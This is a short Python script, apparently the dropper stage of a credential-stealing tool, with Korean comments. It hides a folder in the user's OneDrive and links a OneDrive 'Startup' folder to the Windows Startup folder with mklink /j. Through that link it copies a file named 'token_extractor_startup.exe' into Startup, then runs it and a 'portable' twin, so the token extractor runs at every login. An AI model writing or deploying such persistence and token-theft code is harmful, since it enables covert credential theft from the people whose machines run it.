import subprocess
import threading
import time
import os
import shutil

def create_hidden_folder():
    # Onedrive 경로 가져오기
    home_dir = os.path.expanduser("~")
    onedrive_dir = os.path.join(home_dir, "Onedrive")

    # data 폴더의 경로 join
    data_dir = os.path.join(onedrive_dir, "data")

    # data 폴더 생섬
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)
        os.system("attrib +h " + data_dir)  # 숨김 속성 추가

def create_startup_junction():
    # 사용자의 홈 디렉토리 경로를 가져옴
    home = os.path.expanduser('~')
    # 심볼릭 링크를 만들고자 하는 디렉토리 경로 설정 (시작프로그램 폴더)
    junction_folder = os.path.join(home, 'OneDrive', 'Startup')
    # 원본 디렉토리 경로 설정
    original_folder = os.path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs','Startup')
    # junction_folder가 이미 존재하는 경우 삭제
    if os.path.exists(junction_folder):
        remove_command = 'rmdir "{0}"'.format(junction_folder)
        os.system(remove_command)
    # junction 생성
    command = 'mklink /j "{0}" "{1}"'.format(junction_folder, original_folder)
    # 명령어 실행
    os.system(command)

def copy_extractor():
    home = os.path.expanduser('~')
    junction_folder = os.path.join(home, 'OneDrive', 'Startup')
    shutil.copy("token_extractor_startup.exe", junction_folder)

def run_extractor():
    os.system("token_extractor_portable.exe")
    os.system("token_extractor_startup.exe")


create_hidden_folder()
create_startup_junction()
copy_extractor()
run_extractor()
